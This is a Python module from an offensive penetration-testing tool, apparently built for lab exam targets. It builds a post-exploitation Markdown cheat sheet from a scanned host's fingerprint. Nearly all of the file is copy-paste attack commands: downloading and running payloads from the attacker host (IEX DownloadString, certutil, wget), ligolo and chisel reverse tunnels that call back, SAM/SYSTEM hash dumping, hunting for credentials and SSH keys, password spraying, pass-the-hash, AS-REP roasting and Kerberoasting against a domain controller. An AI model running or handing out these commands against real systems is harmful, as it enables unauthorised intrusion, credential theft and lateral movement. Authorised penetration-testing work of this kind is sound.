"""
core/advisor.py — Context-aware post-exploitation advisor.

Public API:
    generate_advisor_markdown(info, lhost="<LHOST>") -> str

Evaluates a TargetInfo object against the arsenal knowledge base and
returns a fully-formatted Markdown cheat sheet ready to be appended to
notes.md.  Every command is copy-paste ready — the operator only needs
to replace <LHOST> with their tun0 IP.

No exploitation is automated — this generates transfer + execution
commands only.
"""

import re
from typing import List, Optional, TYPE_CHECKING

if TYPE_CHECKING:
    from core.session import TargetInfo

from core.arsenal_rules import (
    AD_TOOLS,
    LINUX_KERNEL_EXPLOITS,
    LINUX_PRIVESC,
    PIVOT_INDICATOR_HOSTNAMES,
    PIVOT_INDICATOR_PORTS,
    PIVOT_TOOLS_LINUX,
    PIVOT_TOOLS_WINDOWS,
    WINDOWS_PRIVESC,
)


# ===========================================================================
# Condition evaluators
# Each function receives a TargetInfo and returns bool.
# ===========================================================================

def _is_old_windows(info: "TargetInfo") -> bool:
    """Win7 / Server 2003 / Server 2008 — anything needing .NET 2.0."""
    return bool(re.search(r"\b(2003|2008|7|xp|vista)\b", info.os_version, re.IGNORECASE))


def _is_modern_windows(info: "TargetInfo") -> bool:
    return info.os_type == "Windows" and not _is_old_windows(info)


def _is_server_2012_to_2022(info: "TargetInfo") -> bool:
    return bool(re.search(r"\b(2012|2016|2019|2022)\b", info.os_version, re.IGNORECASE))


def _has_iis_or_sql(info: "TargetInfo") -> bool:
    """IIS detected in any web-port version string, or MSSQL port is open."""
    if 1433 in info.open_ports:
        return True
    for port in (80, 443, 8080, 8443):
        ver = info.port_details.get(port, {}).get("version", "").lower()
        if "iis" in ver:
            return True
    return False


def _is_ad(info: "TargetInfo") -> bool:
    """Return True when Active Directory indicators are present."""
    if info.is_domain_controller:
        return True
    # Kerberos (88) + any LDAP variant → almost certainly a DC
    if 88 in info.open_ports and (info.open_ports & {389, 636, 3268, 3269}):
        return True
    # A domain name was resolved/discovered
    if info.domain:
        return True
    return False


def _is_x86_64(info: "TargetInfo") -> bool:
    return not re.search(r"\bi[3-6]86\b", info.os_version, re.IGNORECASE)


def _is_x86(info: "TargetInfo") -> bool:
    return bool(re.search(r"\bi[3-6]86\b", info.os_version, re.IGNORECASE))


def _kernel_version(info: "TargetInfo"):
    """Return (major, minor) tuple or None if not parseable."""
    m = re.search(r"(\d+)\.(\d+)", info.os_version)
    if m:
        return int(m.group(1)), int(m.group(2))
    return None


def _kernel_ge_5_8(info: "TargetInfo") -> bool:
    v = _kernel_version(info)
    return v is not None and v >= (5, 8)


def _kernel_le_4_8(info: "TargetInfo") -> bool:
    v = _kernel_version(info)
    return v is not None and v <= (4, 8)


# Map condition key → evaluator function
_CONDITION_MAP = {
    "modern_windows":      _is_modern_windows,
    "old_windows":         _is_old_windows,
    "server_2012_to_2022": _is_server_2012_to_2022,
    "iis_or_sql":          _has_iis_or_sql,
    "is_ad":               _is_ad,
    "x86_64":              _is_x86_64,
    "x86":                 _is_x86,
    "kernel_ge_5_8":       _kernel_ge_5_8,
    "kernel_le_4_8":       _kernel_le_4_8,
}


def _check_condition(condition: Optional[str], info: "TargetInfo") -> bool:
    if condition is None:
        return True
    fn = _CONDITION_MAP.get(condition)
    return fn(info) if fn else False


# ===========================================================================
# Transfer command builders
# ===========================================================================

def _transfer_windows(tool: dict, lhost: str) -> List[str]:
    name = tool["name"]
    url  = f"http://{lhost}:8000/windows/{name}"
    dest = f"C:\\Windows\\Temp\\{name}"

    if tool["ext_type"] == "ps1":
        return [
            f'`IEX (New-Object Net.WebClient).DownloadString("{url}")`',
            f'`Invoke-WebRequest -Uri "{url}" -OutFile "{dest}"`',
        ]
    return [
        f"`certutil.exe -urlcache -f {url} {dest}`",
        f'`Invoke-WebRequest -Uri "{url}" -OutFile "{dest}"`',
    ]


def _transfer_linux(tool: dict, lhost: str) -> List[str]:
    name = tool["name"]
    url  = f"http://{lhost}:8000/linux/{name}"
    return [
        f"`wget {url} -O /tmp/{name} && chmod +x /tmp/{name}`",
        f"`curl -o /tmp/{name} {url} && chmod +x /tmp/{name}`",
    ]


def _tool_block(tool: dict, info: "TargetInfo", lhost: str) -> List[str]:
    """Render a single tool as a Markdown checklist block."""
    name     = tool["name"]
    desc     = tool["desc"]
    run_hint = tool.get("run_hint", "").replace("<LHOST>", lhost)

    lines = [
        f"#### `{name}`",
        "",
        f"> {desc}",
        "",
        "**Transfer to target:**",
        "",
    ]

    if tool["dir"] == "windows":
        for cmd in _transfer_windows(tool, lhost):
            lines.append(f"- [ ] 💡 {cmd}")
    else:
        for cmd in _transfer_linux(tool, lhost):
            lines.append(f"- [ ] 💡 {cmd}")

    if run_hint:
        lines += [
            "",
            "**Execute:**",
            "",
            f"- [ ] 💡 `{run_hint}`",
        ]

    lines.append("")
    return lines


# ===========================================================================
# Pivot detection
# ===========================================================================

def _detect_pivot_indicators(info: "TargetInfo") -> List[str]:
    """
    Return human-readable reasons why this host is a pivot candidate.
    Empty list means no indicators detected.
    """
    reasons: List[str] = []

    # Rule 1a — proxy/VPN ports
    matching = info.open_ports & PIVOT_INDICATOR_PORTS
    if matching:
        reasons.append(
            f"Proxy/VPN/tunnel ports open: {sorted(matching)}"
        )

    # Rule 1b — gateway-indicator hostname keywords
    all_names = list(info.domains_found) + ([info.domain] if info.domain else [])
    for hostname in all_names:
        lower = hostname.lower()
        for kw in PIVOT_INDICATOR_HOSTNAMES:
            if kw in lower:
                reasons.append(
                    f"Gateway-indicator hostname: '{hostname}' (keyword: '{kw}')"
                )
                break  # one reason per hostname is enough

    return reasons


# ===========================================================================
# Post-Shell Survival Kit
# ===========================================================================

def _post_shell_kit(os_type: str) -> List[str]:
    """
    Return Markdown lines for the Post-Shell Survival Kit section.

    Always injected into the report.  Contents are OS-contextualised:
      - "Linux"   → PTY upgrade, Linux LPE one-liners, Linux cred hunting
      - "Windows" → Situational awareness, Windows LPE one-liners, Win cred hunting
      - ""        → Both blocks (OS unknown at scan time)

    Format rule: fenced code blocks only — NO checkbox lists.
    These commands are meant to be double-clicked and pasted verbatim.
    """
    lines: List[str] = [
        "---",
        "",
        "### 🐚 Post-Shell Survival Kit",
        "",
        "> Commands to run **immediately** after landing a shell, before anything else.",
        "> All blocks use plain code fences — double-click to select the whole block.",
        "",
    ]

    # ── Linux block ───────────────────────────────────────────────────────
    if os_type in ("Linux", ""):
        if os_type == "":
            lines += ["#### 🐧 Linux Shell", ""]

        lines += [
            "**1. Stabilise the shell** *(pick whichever binary exists)*",
            "",
            "```bash",
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "# OR",
            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "# OR",
            "script -qc /bin/bash /dev/null",
            "```",
            "",
            "> After spawning PTY:  `Ctrl+Z` → `stty raw -echo` → `fg` → `export TERM=xterm`",
            "",
            "**2. Situational awareness**",
            "",
            "```bash",
            "id && whoami && hostname && ip a",
            "cat /etc/passwd | grep -v nologin | grep -v false",
            "sudo -l",
            "uname -a && cat /etc/os-release",
            "env | grep -i 'path\\|home\\|user\\|pass'",
            "```",
            "",
            "**3. Manual LPE quick-wins** *(run before LinPEAS — fastest checks first)*",
            "",
            "```bash",
            "# SUID binaries",
            "find / -perm -u=s -type f 2>/dev/null",
            "",
            "# File capabilities",
            "getcap -r / 2>/dev/null",
            "",
            "# Writable cron jobs",
            "ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null",
            "cat /etc/crontab 2>/dev/null",
            "",
            "# Writable systemd service files",
            "find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null",
            "",
            "# sudo version (< 1.8.28 → CVE-2019-14287 / 1.9.5p1 → CVE-2021-3156)",
            "sudo --version",
            "",
            "# World-writable files in interesting dirs",
            "find /var/www /opt /srv /home -writable -type f 2>/dev/null | head -20",
            "```",
            "",
            "**4. Credential hunting**",
            "",
            "```bash",
            "# Config files containing password strings",
            "grep -r 'password' /etc /home /var/www 2>/dev/null \\",
            "  --include='*.conf' --include='*.php' --include='*.ini' \\",
            "  --include='*.env' --include='*.xml' -l",
            "",
            "# Shell history",
            "cat ~/.bash_history ~/.zsh_history /root/.bash_history 2>/dev/null",
            "",
            "# SSH keys",
            "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
            "",
            "# Database connection strings",
            "grep -r 'mysqli\\|PDO\\|mysql_connect\\|password' /var/www 2>/dev/null -l",
            "```",
            "",
        ]

    # ── Windows block ─────────────────────────────────────────────────────
    if os_type in ("Windows", ""):
        if os_type == "":
            lines += ["#### 🪟 Windows Shell", ""]

        lines += [
            "**1. Situational awareness**",
            "",
            "```powershell",
            "whoami /all",
            "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"",
            "net user && net localgroup administrators",
            "ipconfig /all",
            "```",
            "",
            "**2. Manual LPE quick-wins** *(run before WinPEAS — fastest checks first)*",
            "",
            "```powershell",
            "# SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege → Potato attacks",
            "whoami /priv | findstr /i \"impersonate\\|assignprimary\"",
            "",
            "# AlwaysInstallElevated (both keys must be 1 → MSI privesc)",
            "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul",
            "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul",
            "",
            "# Unquoted service paths",
            "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\"",
            "",
            "# Writable service binaries",
            "accesschk.exe /accepteula -uwcqv * 2>nul",
            "",
            "# Scheduled tasks (look for non-System tasks with writable binaries)",
            "schtasks /query /fo LIST /v | findstr /i \"task to run\\|run as user\"",
            "```",
            "",
            "**3. Credential hunting**",
            "",
            "```powershell",
            "# Stored Windows credentials",
            "cmdkey /list",
            "",
            "# SAM + SYSTEM hive dump (requires SYSTEM or Admin)",
            "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv",
            "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv",
            "# Then on attacker: impacket-secretsdump -sam sam.hiv -system sys.hiv LOCAL",
            "",
            "# Password strings in common locations",
            "Get-ChildItem C:\\ -Recurse -Include *.txt,*.ini,*.xml,*.config 2>$null `",
            "  | Select-String \"password\" -List | Select-Object Path",
            "",
            "# Unattend / sysprep files",
            "Get-ChildItem C:\\ -Recurse -Include unattend.xml,sysprep.xml,*.inf 2>$null",
            "```",
            "",
        ]

    return lines


# ===========================================================================
# Pivoting & Tunnelling Arsenal
# ===========================================================================

def _pivot_section(info: "TargetInfo", lhost: str) -> List[str]:
    """
    Return Markdown lines for the Pivoting & Tunnelling Arsenal section.

    Always injected.  Contents:
      - Safety warning (transfer binaries first)
      - Dual-homed NIC check (OS-contextualised)
      - Ligolo-ng full workflow (attacker + target + routing)
      - Chisel SOCKS5 reverse proxy workflow
      - proxychains4.conf reminder snippet
      - If is_domain_controller: proxychains AD command block pre-filled
        with the DC IP and domain

    Format: fenced code blocks only — no checkbox lists.
    All <LHOST> placeholders replaced with the operator's actual IP.
    """
    ip     = info.ip
    os_type = info.os_type
    domain  = info.domain or "<DOMAIN>"

    lines: List[str] = [
        "---",
        "",
        "### 🕸️ Pivoting & Tunnelling Arsenal",
        "",
        "> **[!] ⚠️ STOP: Ensure you have transferred the required binaries to the "
        "target first using the File Transfer section above.**",
        "",
        "**Step 0 — Confirm dual-homed status** *(run immediately after shell)*",
        "",
    ]

    # OS-contextualised NIC check
    if os_type == "Windows":
        lines += [
            "```powershell",
            "ipconfig /all          # look for multiple adapters / subnets",
            "route print            # check routing table for internal ranges",
            "```",
            "",
        ]
    else:
        lines += [
            "```bash",
            "ip a                   # look for multiple interfaces",
            "ip route               # check routing table for internal subnets",
            "```",
            "",
        ]

    # ── Ligolo-ng ─────────────────────────────────────────────────────────
    lines += [
        "---",
        "",
        "#### Ligolo-ng *(recommended — transparent full-tunnel, no proxychains)*",
        "",
        "**1. Attacker — start the proxy** *(run once, keep this terminal open)*:",
        "",
        "```bash",
        f"./ligolo-proxy -selfcert -laddr 0.0.0.0:11601",
        "```",
        "",
        "**2. Target — connect back to attacker:**",
        "",
    ]

    if os_type == "Windows":
        lines += [
            "```powershell",
            f".\\ligolo-agent.exe -connect {lhost}:11601 -ignore-cert",
            "```",
            "",
        ]
    else:
        lines += [
            "```bash",
            f"chmod +x ./ligolo-agent 2>/dev/null; ./ligolo-agent -connect {lhost}:11601 -ignore-cert",
            "```",
            "",
        ]

    lines += [
        "**3. Attacker — inside the Ligolo console** *(after agent connects)*:",
        "",
        "```",
        "session          # select the new session",
        "start            # start the tunnel",
        "```",
        "",
        "**4. Attacker — add a route to the internal subnet** *(new terminal)*:",
        "",
        "```bash",
        "# Replace 172.16.x.0/24 with the actual internal subnet from 'ip route' above",
        "sudo ip route add 172.16.x.0/24 dev ligolo",
        "",
        "# Verify",
        "ip route | grep ligolo",
        "```",
        "",
    ]

    # ── Chisel ────────────────────────────────────────────────────────────
    lines += [
        "---",
        "",
        "#### Chisel *(fallback — SOCKS5 reverse proxy via proxychains)*",
        "",
        "**1. Attacker — start the server:**",
        "",
        "```bash",
        f"./chisel server --reverse -p 1080 --socks5",
        "```",
        "",
        "**2. Target — connect back:**",
        "",
    ]

    if os_type == "Windows":
        lines += [
            "```powershell",
            f".\\chisel.exe client {lhost}:1080 R:socks",
            "```",
            "",
        ]
    else:
        lines += [
            "```bash",
            f"chmod +x ./chisel 2>/dev/null; ./chisel client {lhost}:1080 R:socks",
            "```",
            "",
        ]

    # ── proxychains config reminder ───────────────────────────────────────
    lines += [
        "**3. Attacker — configure proxychains** *(add to end of `/etc/proxychains4.conf`)*:",
        "",
        "```",
        "# Comment out any existing socks lines, then add:",
        "socks5  127.0.0.1  1080",
        "```",
        "",
        "**4. Use proxychains to reach the internal network:**",
        "",
        "```bash",
        "proxychains nmap -sT -Pn -p 22,80,443,445,3389 <INTERNAL_IP>",
        "proxychains nxc smb <INTERNAL_IP>",
        "proxychains curl http://<INTERNAL_IP>/",
        "```",
        "",
    ]

    # ── AD Pivot Integration ──────────────────────────────────────────────
    if info.is_domain_controller:
        users_file = f"output/targets/{ip}/users.txt"
        dc_base = (
            "DC=" + ",DC=".join(domain.split("."))
            if "." in domain else f"DC={domain}"
        )
        lines += [
            "---",
            "",
            f"#### 🏰 AD Pivot — Commands for the Internal Domain (`{domain}`)",
            "",
            f"> DC IP: `{ip}` — run these **through proxychains** (Chisel) or **directly** (Ligolo tunnel).",
            "",
            "**SMB reachability check:**",
            "",
            "```bash",
            f"proxychains nxc smb {ip}",
            f"proxychains nxc smb {ip} -u '' -p '' --shares",
            "```",
            "",
            "**AS-REP Roasting through the tunnel:**",
            "",
            "```bash",
            f"proxychains impacket-GetNPUsers {domain}/ -usersfile {users_file} "
            f"-format hashcat -dc-ip {ip} -no-pass",
            "```",
            "",
            "**Kerberoasting through the tunnel:**",
            "",
            "```bash",
            f"proxychains impacket-GetUserSPNs {domain}/'<USER>:<PASS>' -dc-ip {ip} -request",
            "```",
            "",
            "**BloodHound collection through the tunnel:**",
            "",
            "```bash",
            f"proxychains bloodhound-python -u '<USER>' -p '<PASS>' "
            f"-d {domain} -dc {ip} -c All --dns-tcp",
            "```",
            "",
            "**LDAP enumeration through the tunnel:**",
            "",
            "```bash",
            f"proxychains ldapsearch -x -H ldap://{ip} -b '{dc_base}' "
            f"'(objectClass=user)' sAMAccountName",
            "```",
            "",
        ]

    lines += ["---", ""]
    return lines


# ===========================================================================
# Main generator
# ===========================================================================

def generate_advisor_markdown(info: "TargetInfo", lhost: str = "<LHOST>") -> str:
    """
    Evaluate session.info against the arsenal knowledge base.
    Returns a complete Markdown section string for appending to notes.md.
    """
    os_type = info.os_type  # "Windows" | "Linux" | ""

    lines: List[str] = [
        "---",
        "",
        "## 🎯 Arsenal Recommender — PrivEsc & Post-Exploitation Cheat Sheet",
        "",
        "> *Dynamically generated based on this target's fingerprint.*",
        ">",
        f"> **OS:** `{os_type or 'Unknown'}`  "
        f"**Version:** `{info.os_version or 'Unknown'}`  "
        f"**Domain:** `{'✅ ' + info.domain if info.domain else '❌ None detected'}`",
        ">",
        "> ⚠️ Replace every `<LHOST>` with your **tun0** IP before running.",
        "",
        "> **Start your file server first** (organise tools as `tools/windows/` and `tools/linux/`):",
        "> ```bash",
        "> cd ~/tools && python3 -m http.server 8000",
        "> ```",
        "",
    ]

    # ── Pivot Rule 1: Critical warning if gateway indicators found ────────
    pivot_reasons = _detect_pivot_indicators(info)
    if pivot_reasons:
        lines += [
            "### 🚨 CRITICAL TACTICAL WARNING — PIVOT CANDIDATE DETECTED",
            "",
            "> **Gateway/Proxy indicators detected.**",
            "> **High probability this machine routes to an internal network.**",
            "> **Pivoting is mandatory before continuing lateral movement.**",
            "",
        ]
        for reason in pivot_reasons:
            lines.append(f"- ⚠️  {reason}")
        lines.append("")

    # ── Post-Shell Survival Kit (always generated, OS-contextualised) ────────
    lines += _post_shell_kit(os_type)

    # ── Windows tools ─────────────────────────────────────────────────────
    if os_type == "Windows":
        win_tools = [t for t in WINDOWS_PRIVESC if _check_condition(t["condition"], info)]
        if win_tools:
            lines += [
                "### 🪟 Windows PrivEsc Arsenal",
                "",
            ]
            for tool in win_tools:
                lines += _tool_block(tool, info, lhost)

        ad_tools = [t for t in AD_TOOLS if _check_condition(t["condition"], info)]
        if ad_tools:
            lines += [
                "### 🏰 Active Directory Arsenal",
                "",
                "> Triggered: Kerberos / LDAP / domain indicators confirmed on this target.",
                "",
            ]
            for tool in ad_tools:
                lines += _tool_block(tool, info, lhost)

    # ── Linux tools ───────────────────────────────────────────────────────
    elif os_type == "Linux":
        lx_tools = [t for t in LINUX_PRIVESC if _check_condition(t["condition"], info)]
        if lx_tools:
            lines += [
                "### 🐧 Linux PrivEsc Arsenal",
                "",
            ]
            for tool in lx_tools:
                lines += _tool_block(tool, info, lhost)

        kernel_tools = [
            t for t in LINUX_KERNEL_EXPLOITS if _check_condition(t["condition"], info)
        ]
        if kernel_tools:
            lines += [
                "### 💥 Kernel Exploit Arsenal",
                "",
            ]
            version_triggered = any(
                t["condition"] in ("kernel_ge_5_8", "kernel_le_4_8")
                for t in kernel_tools
                if t["condition"]
            )
            if version_triggered:
                lines += [
                    f"> ⚠️  Kernel version `{info.os_version}` detected — confirm with "
                    "`uname -r` on the target before using exploits.",
                    "",
                ]
            for tool in kernel_tools:
                lines += _tool_block(tool, info, lhost)

    # ── OS unknown ────────────────────────────────────────────────────────
    else:
        lines += [
            "> ⚠️  OS type could not be determined from scan data.",
            "> After gaining a foothold, run `uname -a` (Linux) or `systeminfo` (Windows)",
            "> to confirm, then re-evaluate which tools apply.",
            "",
        ]

    # ── Gap 1: Credential Chain Attack Surface ────────────────────────────
    # Triggered whenever usernames were discovered AND at least one service
    # that accepts username/password authentication is reachable.
    _spray_ports = {22, 139, 445, 3389, 5985, 5986}
    if info.users_found and (info.open_ports & _spray_ports):
        ip = info.ip
        users_file = f"output/targets/{ip}/users.txt"
        lines += [
            "### 🔑 Credential Chain Attack Surface",
            "",
            f"> **{len(info.users_found)} username(s) discovered** and stored in "
            f"`{users_file}`  ",
            "> Spray each open service — check the lockout policy first.",
            "",
        ]

        if 445 in info.open_ports or 139 in info.open_ports:
            lines += [
                "**SMB spray (netexec):**",
                "",
                "```bash",
                f"# Password spray — one password across all users",
                f"nxc smb {ip} -u {users_file} -p '<PASSWORD>' --continue-on-success",
                f"# Common weak patterns",
                f"nxc smb {ip} -u {users_file} -p 'Password123' --continue-on-success",
                f"nxc smb {ip} -u {users_file} -p '' --continue-on-success",
                "```",
                "",
            ]

        if 22 in info.open_ports:
            lines += [
                "**SSH spray (hydra):**",
                "",
                "```bash",
                f"hydra -L {users_file} -p '<PASSWORD>' ssh://{ip}",
                f"hydra -L {users_file} -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4",
                "```",
                "",
            ]

        if 5985 in info.open_ports or 5986 in info.open_ports:
            lines += [
                "**WinRM spray (netexec):**",
                "",
                "```bash",
                f"nxc winrm {ip} -u {users_file} -p '<PASSWORD>' --continue-on-success",
                "```",
                "",
            ]

        if 3389 in info.open_ports:
            lines += [
                "**RDP spray (hydra / netexec):**",
                "",
                "```bash",
                f"nxc rdp {ip} -u {users_file} -p '<PASSWORD>' --continue-on-success",
                f"hydra -L {users_file} -p '<PASSWORD>' rdp://{ip}",
                "```",
                "",
            ]

    # ── Gap 2: Pass-the-Hash ──────────────────────────────────────────────
    # Triggered when NTLM hashes have been captured AND SMB or WinRM is open.
    _pth_ports = {139, 445, 5985, 5986}
    if info.ntlm_hashes_found and (info.open_ports & _pth_ports):
        ip = info.ip
        lines += [
            "### 🔓 Pass-the-Hash Attack Surface",
            "",
            "> **NTLM hashes captured** — attempt direct authentication without cracking.",
            "> Replace `<USER>` and `<HASH>` with values from your loot.",
            "",
        ]

        if 445 in info.open_ports or 139 in info.open_ports:
            lines += [
                "**SMB PtH (netexec):**",
                "",
                "```bash",
                f"nxc smb {ip} -u '<USER>' -H '<NTLM_HASH>'",
                f"nxc smb {ip} -u '<USER>' -H '<NTLM_HASH>' --shares",
                f"nxc smb {ip} -u '<USER>' -H '<NTLM_HASH>' -x 'whoami'",
                "```",
                "",
            ]

        if 5985 in info.open_ports or 5986 in info.open_ports:
            lines += [
                "**WinRM PtH (evil-winrm / netexec):**",
                "",
                "```bash",
                f"evil-winrm -i {ip} -u '<USER>' -H '<NTLM_HASH>'",
                f"nxc winrm {ip} -u '<USER>' -H '<NTLM_HASH>'",
                "```",
                "",
            ]

        lines += [
            "**Impacket suite (exec / secretsdump):**",
            "",
            "```bash",
            f"impacket-psexec '<USER>'@{ip} -hashes ':<NTLM_HASH>'",
            f"impacket-wmiexec '<USER>'@{ip} -hashes ':<NTLM_HASH>'",
            f"impacket-secretsdump '<USER>'@{ip} -hashes ':<NTLM_HASH>'",
            "```",
            "",
        ]

    # ── Gap 4: Active Directory DC Attack Surface ─────────────────────────
    # Triggered when this host is confirmed (or inferred) to be a DC.
    if info.is_domain_controller:
        ip     = info.ip
        domain = info.domain or "<DOMAIN>"
        users_file = f"output/targets/{ip}/users.txt"
        lines += [
            "### 🏰 Active Directory Attack Surface",
            "",
            f"> **Domain Controller confirmed** — `{ip}` (domain: `{domain}`)  ",
            "> Run these enumeration steps in order.  ",
            "> Replace `<DOMAIN>` if the domain name was not auto-detected.",
            "",
        ]

        lines += [
            "**AS-REP Roasting** *(no pre-auth required — no credentials needed)*:",
            "",
            "```bash",
            f"# With user list (discovered users)",
            f"impacket-GetNPUsers {domain}/ -usersfile {users_file} "
            f"-format hashcat -dc-ip {ip} -no-pass",
            f"# Blind (enumerate via LDAP anonymous bind first)",
            f"impacket-GetNPUsers {domain}/ -dc-ip {ip} -no-pass -request",
            "```",
            "",
        ]

        lines += [
            "**Kerberoasting** *(requires valid credentials)*:",
            "",
            "```bash",
            f"impacket-GetUserSPNs {domain}/'<USER>:<PASS>' -dc-ip {ip} -request",
            f"nxc ldap {ip} -u '<USER>' -p '<PASS>' --kerberoasting kerberoast.txt",
            "```",
            "",
        ]

        lines += [
            "**Anonymous LDAP Enumeration** *(no credentials needed)*:",
            "",
            "```bash",
            f"windapsearch.py -d {domain} --dc-ip {ip} -U",
            f"ldapsearch -x -H ldap://{ip} -b 'DC={',DC='.join(domain.split('.')) if '.' in domain else domain}' '(objectClass=user)' sAMAccountName",
            f"nxc ldap {ip} -u '' -p '' --users",
            "```",
            "",
        ]

        lines += [
            "**BloodHound Collection** *(authenticated — map the full attack path)*:",
            "",
            "```bash",
            f"# With password",
            f"nxc ldap {ip} -u '<USER>' -p '<PASS>' --bloodhound --collection All",
            f"# With hash (PtH)",
            f"nxc ldap {ip} -u '<USER>' -H '<NTLM_HASH>' --bloodhound --collection All",
            f"# Alternatively with bloodhound-python",
            f"bloodhound-python -u '<USER>' -p '<PASS>' -d {domain} -dc {ip} -c All",
            "```",
            "",
        ]

        if info.users_found:
            lines += [
                "**Password Spray** *(check lockout policy first — AS-REP roast gives you hashes to crack first)*:",
                "",
                "```bash",
                f"kerbrute passwordspray --dc {ip} -d {domain} {users_file} 'Password123'",
                f"nxc smb {ip} -u {users_file} -p 'Password123' --continue-on-success",
                "```",
                "",
            ]

    # ── Pivot Rule 2: Operational pivoting section ───────────────────────
    lines += _pivot_section(info, lhost)

    return "\n".join(lines)
